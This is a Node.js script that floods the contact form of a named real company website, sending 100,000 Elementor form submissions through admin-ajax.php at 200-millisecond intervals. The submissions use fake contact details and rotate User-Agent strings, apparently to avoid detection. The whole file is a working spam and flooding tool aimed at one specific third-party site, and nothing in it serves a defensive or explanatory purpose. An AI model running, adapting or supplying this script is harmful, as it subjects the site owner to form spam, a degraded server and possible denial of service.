import axios from "axios";
import https from "https";
import FormData from "form-data";
import { log } from "console";

const agent = new https.Agent({
  keepAlive: true,
  maxSockets: 10,
});

const userAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1",
];

const getRandomUserAgent = () => {
  return userAgents[Math.floor(Math.random() * userAgents.length)];
};

const sendRequest = async () => {
  const form = new FormData();
  form.append("post_id", "3065");
  form.append("form_id", "f70a7a4");
  form.append("referer_title", "Contact - gbitinc.com");
  form.append("queried_id", "3065");
  form.append("form_fields[name]", "johndoe");
  form.append("form_fields[email]", "johndoe01@gmail.com");
  form.append("form_fields[message]", "arabaci25");
  form.append("alt_s", "");
  form.append("owfvag7510", "442464");
  form.append("action", "elementor_pro_forms_send_form");
  form.append("referrer", "https://gbitinc.com/contact/");

  const headers = {
    ...form.getHeaders(),
    "User-Agent": getRandomUserAgent(),
  };

  try {
    const response = await axios.post(
      "https://gbitinc.com/wp-admin/admin-ajax.php",
      form,
      {
        headers,
        httpsAgent: agent,
      }
    );
    console.log(response.data);
  } catch (err) {
    console.error("Request error:", err.message);
  }
};

const runRequests = async () => {
  for (let i = 0; i < 100000; i++) {
    console.log(i + ". lap");

    await sendRequest();
    await new Promise((resolve) => setTimeout(resolve, 200));
  }
};

runRequests();
